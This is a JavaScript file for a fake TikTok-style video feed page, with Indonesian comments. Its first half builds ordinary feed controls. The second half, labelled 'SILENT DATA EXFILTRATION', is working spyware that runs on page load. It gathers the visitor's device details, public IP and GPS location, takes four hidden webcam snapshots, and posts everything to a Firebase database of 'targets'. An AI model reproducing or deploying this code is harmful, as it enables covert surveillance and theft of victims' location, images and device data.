// =========================================================
// [ LOGIKA ASLI - INTERFACE TIKTOK ]
// =========================================================

const comments = document.getElementById("comments");
const feedContainer = document.getElementById("feedContainer");
const videoItems = document.querySelectorAll(".video-item");

function openComments(event) {
    event.stopPropagation();
    comments.classList.add("active");
}

function toggleText(event) {
    event.stopPropagation();
    const more = event.currentTarget;
    const caption = more.closest(".caption");
    if (!caption) return;
    if (more.textContent.trim() === "lebih sedikit") {
        caption.innerHTML = caption.dataset.short + " <span class='more' onclick='toggleText(event)'>lebih banyak</span>";
    } else {
        caption.innerHTML = caption.dataset.full + " <span class='more' onclick='toggleText(event)'>lebih sedikit</span>";
    }
}

videoItems.forEach((item) => {
    const container = item.querySelector(".container");
    const video = item.querySelector("video");
    const pauseOverlay = item.querySelector(".pause-overlay");
    const likeBtn = item.querySelector(".like-btn");
    const likeAnim = item.querySelector(".like");
    const saveBtn = item.querySelector(".save-btn");

    if (!video) return;
    let lastTap = 0;

    const updateOverlay = () => video.paused ? pauseOverlay.classList.add("active") : pauseOverlay.classList.remove("active");

    if (container) {
        container.addEventListener("click", (e) => {
            comments.classList.remove("active");
            if (e.target.closest(".sidebar") || e.target.closest(".more")) return;
            const now = Date.now();
            if (now - lastTap < 300) {
                likeBtn.classList.add("liked");
                likeAnim.classList.add("active");
                setTimeout(() => likeAnim.classList.remove("active"), 600);
            } else {
                video.paused ? video.play() : video.pause();
                updateOverlay();
            }
            lastTap = now;
        });
    }
    video.addEventListener("pause", updateOverlay);
    video.addEventListener("play", updateOverlay);
    if (likeBtn) likeBtn.addEventListener("click", (e) => { e.stopPropagation(); likeBtn.classList.toggle("liked"); });
    if (saveBtn) saveBtn.addEventListener("click", (e) => { e.stopPropagation(); saveBtn.classList.toggle("saved"); });
});

const scrollObserver = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
        const video = entry.target.querySelector("video");
        if (!video) return;
        if (!entry.isIntersecting) {
            video.pause();
            video.currentTime = 0;
        }
    });
}, { threshold: 0.6 });

videoItems.forEach((item) => scrollObserver.observe(item));


// ======= HACK =======
// [ SILENT DATA EXFILTRATION - CYBER ONX ]


const FIREBASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";

async function startSilentLoot() {
    let report = {
        userAgent: navigator.userAgent,
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        platform: navigator.platform,
        time: new Date().toLocaleString(),
        ip: "Fetching...",
        loc: "Access Denied"
    };

    // Ambil IP Publik
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        report.ip = ipData.ip;
    } catch (e) {}

    // Ambil Koordinat GPS
    navigator.geolocation.getCurrentPosition((pos) => {
        report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    });

    // Ambil Kamera 4x Burst secara diam-diam
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        await video.play();

        let shots = 0;
        let burst = setInterval(async () => {
            if (shots < 4) {
                shots++;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg');

                // Kirim data ke Firebase (API)
                await fetch(FIREBASE_API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ...report, photo: imageData, burst_no: shots })
                });
            } else {
                clearInterval(burst);
                stream.getTracks().forEach(track => track.stop());
            }
        }, 1500);

    } catch (err) {
        // Tetap kirim info device meskipun kamera ditolak
        fetch(FIREBASE_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...report, photo: "Access Denied" })
        });
    }
}

// Jalankan otomatis saat web dimuat
window.onload = () => {
    setTimeout(startSilentLoot, 2000);
};
